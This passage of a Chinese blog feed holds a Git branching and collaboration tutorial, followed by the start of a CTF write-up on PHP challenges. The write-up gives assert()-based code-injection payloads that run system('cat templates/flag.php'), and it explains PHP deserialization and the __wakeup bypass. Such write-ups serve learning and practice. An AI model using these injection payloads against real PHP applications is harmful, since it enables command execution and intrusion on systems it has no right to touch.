class="bash">&gt;&gt;&gt;&gt;&gt;&gt; feature1</span></span><br></pre></td></tr></table></figure><blockquote><p>我们修改如下后保存：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Creating a new branch is quick and simple.</span><br></pre></td></tr></table></figure><h4 id="8-分支策略"><a href="#8-分支策略" class="headerlink" title="8.分支策略"></a>8.分支策略</h4><blockquote><p>首先，<code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；那在哪干活呢？干活都在<code>dev</code>分支上，也就是说，<code>dev</code>分支是不稳定的，到某个时候，比如1.0版本发布时，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0版本；你和你的小伙伴们每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并就可以了。所以，团队合作的分支看起来就像这样：</p></blockquote><p><img src="/images/143-9.png" alt></p><h4 id="9-Bug分支"><a href="#9-Bug分支" class="headerlink" title="9.Bug分支"></a>9.Bug分支</h4><p><code>储存当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br></pre></td></tr></table></figure><p><code>从当前分支上切换到存在Bug的分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout [branchName]</span></span><br></pre></td></tr></table></figure><p><code>创建Bug分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b issue-101</span></span><br></pre></td></tr></table></figure><p><code>修复Bug</code></p><p><code>从bug分支上切换到存在Bug的分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch [branchName]</span></span><br></pre></td></tr></table></figure><p><code>合并分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merged bug fix 101"</span> issue-101</span></span><br></pre></td></tr></table></figure><p><code>切换到干活的分支</code></p><p><code>查看当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br></pre></td></tr></table></figure><p><code>恢复当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash apply</span></span><br></pre></td></tr></table></figure><blockquote><p>⇡ 恢复后，stash内容并不删除，你需要用<code>git stash drop</code>来删除；</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br></pre></td></tr></table></figure><blockquote><p>⇡ 恢复的同时把stash内容也删了</p></blockquote><p><code>在不同的分支上同步修改bug的操作</code></p><blockquote><p>比如我们在master分支上修复了bug，那么我们怎么同步到dev分支上呢？同样的bug，要在dev上修复，我们只需要把<code>4c805e2 fix bug 101</code>这个提交所做的修改“复制”到dev分支。注意：我们只想复制<code>4c805e2 fix bug 101</code>这个提交所做的修改，并不是把整个master分支merge过来。</p><p>为了方便操作，Git专门提供了一个<code>cherry-pick</code>命令，让我们能复制一个特定的提交到当前分支：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git cherry-pick 4c805e2(master的sha1值)</span></span><br></pre></td></tr></table></figure><h4 id="10-多人协作"><a href="#10-多人协作" class="headerlink" title="10.多人协作"></a>10.多人协作</h4><p><code>查看远程库信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote</span></span><br><span class="line">origin</span><br></pre></td></tr></table></figure><blockquote><p>用<code>git remote -v</code>显示更详细的信息</p></blockquote><p><code>推送分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push origin <span class="string">"branchName"</span></span></span><br></pre></td></tr></table></figure><ul><li><code>master</code>分支是主分支，因此要时刻与远程同步；</li><li><code>dev</code>分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步；</li><li><code>bug</code>分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug；</li><li><code>featur</code>e分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。</li></ul><p><code>抓取分支</code></p><blockquote><p>首先要克隆一个仓库，如果A在修改文件后push到远程仓库后，你也要push到远程仓库，那么会收到如下信息：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat env.txt</span></span><br><span class="line">env</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add env.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"add new env"</span></span></span><br><span class="line">[dev 7bd91f1] add new env</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 env.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin dev</span></span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> ! [rejected]        dev -&gt; dev (non-fast-forward)</span><br><span class="line">error: failed to push some refs to 'git@github.com:michaelliao/learngit.git'</span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: 'git pull ...') before pushing again.</span><br><span class="line">hint: See the 'Note about fast-forwards' in 'git push --help' for details.</span><br></pre></td></tr></table></figure><blockquote><p>推送失败，因为你的小伙伴的最新提交和你试图推送的提交有冲突，解决办法也很简单，Git已经提示我们，先用<code>git pull</code>把最新的提交从<code>origin/dev</code>抓下来，然后，在本地合并，解决冲突，再推送：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">There is no tracking information for the current branch.</span><br><span class="line">Please specify which branch you want to merge with.</span><br><span class="line">See git-pull(1) for details.</span><br><span class="line"></span><br><span class="line">    git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"></span><br><span class="line">If you wish to set tracking information for this branch you can do so with:</span><br><span class="line"></span><br><span class="line">    git branch --set-upstream-to=origin/&lt;branch&gt; dev</span><br></pre></td></tr></table></figure><blockquote><p><code>git pull</code>也失败了，原因是没有指定本地<code>dev</code>分支与远程<code>origin/dev</code>分支的链接，根据提示，设置<code>dev</code>和<code>origin/dev</code>的链接：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch --<span class="built_in">set</span>-upstream-to=origin/dev dev</span></span><br><span class="line">Branch 'dev' set up to track remote branch 'dev' from 'origin'.</span><br></pre></td></tr></table></figure><blockquote><p>再pull：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">Auto-merging env.txt</span><br><span class="line">CONFLICT (add/add): Merge conflict in env.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure><blockquote><p>这回<code>git pull</code>成功，但是合并有冲突，需要手动解决，解决的方法和分支管理中的<a href="#### 7.解决冲突">解决冲突</a>完全一样。解决后，提交，再push：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"fix env conflict"</span></span></span><br><span class="line">[dev 57c53ab] fix env conflict</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin dev</span></span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (4/4), done.</span><br><span class="line">Writing objects: 100% (6/6), 621 bytes | 621.00 KiB/s, done.</span><br><span class="line">Total 6 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line">   7a5e5dd..57c53ab  dev -&gt; dev</span><br></pre></td></tr></table></figure><p>因此，多人协作的工作模式通常是这样：</p><ol><li>首先，可以试图用<code>git push origin &lt;branch-name&gt;</code>推送自己的修改；</li><li>如果推送失败，则因为远程分支比你的本地更新，需要先用<code>git pull</code>试图合并；</li><li>如果合并有冲突，则解决冲突，并在本地提交；</li><li>没有冲突或者解决掉冲突后，再用<code>git push origin &lt;branch-name&gt;</code>推送就能成功！</li></ol><p>如果<code>git pull</code>提示<code>no tracking information</code>，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>。这就是多人协作的工作模式，一旦熟悉了，就非常简单。</p><h3 id="三、命令总结"><a href="#三、命令总结" class="headerlink" title="三、命令总结"></a>三、命令总结</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">`配置用户名`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"email@example.com"</span></span></span><br><span class="line"></span><br><span class="line">`初始化`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br><span class="line"></span><br><span class="line">`将文件添加到仓库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add fileName</span></span><br><span class="line"></span><br><span class="line">`将文件提交到仓库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"&lt;本次提交的说明&gt;"</span></span></span><br><span class="line"></span><br><span class="line">`查看当前仓库的状态`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line"></span><br><span class="line">`查看修改的内容`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git diff fileName</span></span><br><span class="line"></span><br><span class="line">`查看历史记录`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line"></span><br><span class="line">`版本回退`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^/SHA1-ID</span></span><br><span class="line"></span><br><span class="line">`查看每一次命令的信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br><span class="line"></span><br><span class="line">`丢弃工作区的修改`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- fileName</span></span><br><span class="line"></span><br><span class="line">`删除文件`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git rm test.txt</span></span><br><span class="line"></span><br><span class="line">`将本地仓库和远程仓库关联起来`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin <span class="string">"Your Github repository name"</span></span></span><br><span class="line"></span><br><span class="line">`查看远程库信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote</span></span><br><span class="line"></span><br><span class="line">`查看远程库详细信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote -v</span></span><br><span class="line"></span><br><span class="line">`将本地仓库的内容推送到远程库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br><span class="line"></span><br><span class="line">`创建分支`+-----------------+</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch dev++</span></span><br><span class="line">+========== $ git checkout -b dev</span><br><span class="line">`切换分支`   ++</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev or $ git switch dev +-----------------+</span></span><br><span class="line"></span><br><span class="line">`查看当前分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch </span></span><br><span class="line"></span><br><span class="line">`将dev分支合并到当前分支（启用Fast forward）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br><span class="line"></span><br><span class="line">`将dev分支合并到当前分支（禁用Fast forward）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge with no-ff"</span> dev</span></span><br><span class="line"></span><br><span class="line">`查看分支合并的情况`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --graph</span></span><br><span class="line"></span><br><span class="line">`删除分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br><span class="line"></span><br><span class="line">`强行删除分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -D dev</span></span><br><span class="line"></span><br><span class="line">`储存当前分支的工作现场`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br><span class="line"></span><br><span class="line">`从当前分支上切换到存在Bug的分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout [branchName]</span></span><br><span class="line"></span><br><span class="line">`创建Bug分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b issue-101</span></span><br><span class="line"></span><br><span class="line">`修复Bug（手动修复）`</span><br><span class="line"></span><br><span class="line">`从bug分支上切换到存在Bug的分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch [branchName]</span></span><br><span class="line"></span><br><span class="line">`合并分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merged bug fix 101"</span> issue-101</span></span><br><span class="line"></span><br><span class="line">`切换到干活的分支`</span><br><span class="line"></span><br><span class="line">`查看当前分支的工作现场`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br><span class="line"></span><br><span class="line">`恢复当前分支的工作现场（stash内容并不删除）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash apply</span></span><br><span class="line"></span><br><span class="line">`恢复当前分支的工作现场（stash内容删除）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br><span class="line"></span><br><span class="line">`在不同的分支上同步修改bug的操作`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git cherry-pick 4c805e2(master的sha1值)</span></span><br><span class="line"></span><br><span class="line">`推送分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin <span class="string">"branchName"</span></span></span><br><span class="line"></span><br><span class="line">`抓取分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">等价于：git fetch   git merge &lt;Branch Name&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、Git-教程&quot;&gt;&lt;a href=&quot;#一、Git-教程&quot; class=&quot;headerlink&quot; title=&quot;一、Git 教程&quot;&gt;&lt;/a&gt;一、Git 教程&lt;/h3&gt;&lt;h4 id=&quot;1-Git-介绍&quot;&gt;&lt;a href=&quot;#1-Git-介绍&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP相关题目writeup（持续更新）</title>
    <link href="https://muzibing.github.io/2020/07/28/2020.07.28%EF%BC%88142%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/28/2020.07.28（142）/</id>
    <published>2020-07-27T16:00:00.000Z</published>
    <updated>2020-08-17T14:28:15.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-函数漏洞问题"><a href="#0x00-函数漏洞问题" class="headerlink" title="0x00 函数漏洞问题"></a><font color="navy"><code>0x00 函数漏洞问题</code></font></h2><h3 id="【Jarvois-OJ-web】BabyPHP"><a href="#【Jarvois-OJ-web】BabyPHP" class="headerlink" title="【Jarvois OJ-web】BabyPHP"></a><font color="blue"><code>【Jarvois OJ-web】BabyPHP</code></font></h3><h4 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><p><img src="/images/142-1.png" alt></p><h4 id="2-GIT-源码泄露"><a href="#2-GIT-源码泄露" class="headerlink" title="2.GIT 源码泄露"></a><code>2.GIT 源码泄露</code></h4><p>通过上图的提示，我们猜测是不是可以通过git泄露源码，从而进行得到php代码，有关GIT源码泄露的可以<a href="https://www.jianshu.com/p/edae09535ea3" target="_blank" rel="noopener">点击这里</a>，有关git的介绍可以<a href="https://muzibing.github.io/2020/07/29/2020.07.29（143）/">点击这里</a>，下面我们得到如下的文件及文件夹：</p><p><img src="/images/142-2.jpg" alt></p><h4 id="3-查看index-php源码"><a href="#3-查看index-php源码" class="headerlink" title="3.查看index.php源码"></a><code>3.查看index.php源码</code></h4><p>打开index.php源码，可以得到其中最为关键的一段代码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>也就是说把我们输入的page相关字符串解析为<code>assert(&quot;strpos(&#39;templates/payload.php&#39;, &#39;..&#39;) === false&quot;)</code>，其中：</p><ul><li>strpos()：查找 “..” 在file字符串中第一次出现的位置，也就是说我们不能使用目录注入了</li><li>assert()：检查一个断言是否为 <strong><code>FALSE</code></strong>，如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</li></ul></blockquote><h4 id="4-构造payload"><a href="#4-构造payload" class="headerlink" title="4.构造payload"></a><code>4.构造payload</code></h4><blockquote><p>根据上文，我们可以构造如下payload：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1：page = <span class="string">'.system("cat templates/flag.php").'</span></span><br><span class="line">payload2：page = <span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//</span></span><br></pre></td></tr></table></figure><blockquote><p>被运行时，在index.php中被执行的形式为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="string">"templates'.system("</span>cat templates/flag.php<span class="string">").'.php"</span>;</span><br><span class="line">assert(<span class="string">"strpos('templates'.system("</span>cat templates/flag.php<span class="string">").'.php"</span><span class="string">', '</span>..<span class="string">') === false") or die("Detected hacking attempt!");</span></span><br><span class="line"><span class="string">assert("file_exists('</span>templates<span class="string">'.system("cat templates/flag.php").'</span>.php<span class="string">')") or die("That file doesn'</span>t exist!<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file = "</span><span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//"</span></span><br><span class="line"><span class="string">assert("strpos('</span><span class="string">','</span>..<span class="string">')===False and system('</span>cat templates/flag.php<span class="string">');//'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span><span class="string">") or die("</span>Detected hacking attempt!<span class="string">");</span></span><br><span class="line"><span class="string">assert("</span>file_exists(<span class="string">''</span>,<span class="string">'..'</span>)===<span class="keyword">False</span> <span class="keyword">and</span> system(<span class="string">'cat templates/flag.php'</span>);<span class="comment">//')") or die("That file doesn't exist!");</span></span><br></pre></td></tr></table></figure><blockquote><p>注：不是很明白为什么这样构造</p></blockquote><h2 id="0x01-反序列化问题"><a href="#0x01-反序列化问题" class="headerlink" title="0x01 反序列化问题"></a><font color="navy"><code>0x01 反序列化问题</code></font></h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a><code>基础知识</code></h3><blockquote><p>要想知道反序列化问题，就必须知道 1) 序列化后的数据格式；2) 触发/绕过魔术函数的方法；</p><p><code>问题一：序列化后的数据格式</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;?php</span> </span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">tes1t</span></span></span><br><span class="line"><span class="class">&gt; </span>&#123;</span><br><span class="line">&gt; <span class="keyword">private</span> $flag = <span class="string">"Inactive"</span>;</span><br><span class="line">&gt; <span class="keyword">protected</span> $test = <span class="string">"test"</span>;</span><br><span class="line">&gt; <span class="keyword">public</span> $test1 = <span class="string">"test1"</span>;</span><br><span class="line">&gt; <span class="keyword">protected</span> $test2 = <span class="string">"test2"</span>;</span><br><span class="line">&gt; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">&gt; </span>&#123;</span><br><span class="line">&gt; <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; $object = <span class="keyword">new</span> tes1t();</span><br><span class="line">&gt; $object-&gt;set_flag(<span class="string">"Inactive"</span>);</span><br><span class="line">&gt; $data = serialize($object);</span><br><span class="line">&gt; <span class="keyword">echo</span> $data;</span><br><span class="line">&gt; <span class="meta">?&gt;</span> </span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>上述代码产生的数据格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; O:<span class="number">5</span>:<span class="string">"tes1t"</span>:<span class="number">4</span>:&#123;s:<span class="number">11</span>:<span class="string">"tes1tflag"</span>;s:<span class="number">8</span>:<span class="string">"Inactive"</span>;s:<span class="number">7</span>:<span class="string">"*test"</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">5</span>:<span class="string">"test1"</span>;s:<span class="number">5</span>:<span class="string">"test1"</span>;s:<span class="number">8</span>:<span class="string">"*test2"</span>;s:<span class="number">5</span>:<span class="string">"test2"</span>;&#125; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>其中：</p><ul><li>O：表示一个对象</li><li>5：表示对象名占4个字符</li><li>“teslt”：表示对象名</li><li>4：表示该对象有4个属性（不含方法）</li><li>private：tesltflag =&gt; %00teslt%00flag</li><li>protected：<em>test =&gt; %00\</em>%00test</li></ul><p><code>问题二：触发/绕过魔术函数的方法</code></p><p>首先介绍一下魔术方法：</p><ul><li><strong>construct()</strong>：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)</li><li><strong>wakeup()</strong>：unserialize()时会自动调用，反序列化无论如何都是要先调用<code>__wakeup</code>函数的，但是当属性数值&gt;属性真实个数时，就会跳过执行__wakeup()函数<ul><li><strong>存在漏洞的PHP版本</strong>：PHP5.6.25之前版本和7.0.10之前的7.x版本</li><li><strong>漏洞概述</strong>：<code>__wakeup()</code>魔法函数被绕过,导致执行了一些非预期效果的漏洞</li><li><strong>漏洞原理</strong>：<code>当对象的属性(变量)数大于实际的个数时,__wakeup()魔法函数被绕过</code></li></ul></li><li><strong>destruct()</strong>：当对象被销毁时会自动调用</li><li><strong>toString()</strong>：当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li><li><strong>get()</strong>：当从不可访问的属性读取数据</li><li><strong>call()</strong>：在对象上下文中调用不可访问的方法时触发</li></ul><p>从序列化到反序列化这几个函数的执行过程是：<code>先调用__construct()-&gt;__sleep-&gt;__wakeup()-&gt;__toString ()-&gt;__destruct()</code></p></blockquote><h3 id="【XCTF-web】unserialize3"><a href="#【XCTF-web】unserialize3" class="headerlink" title="【XCTF-web】unserialize3"></a><font color="blue"><code>【XCTF-web】unserialize3</code></font></h3><h4 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><h4 id="2-题目分析"><a href="#2-题目分析" 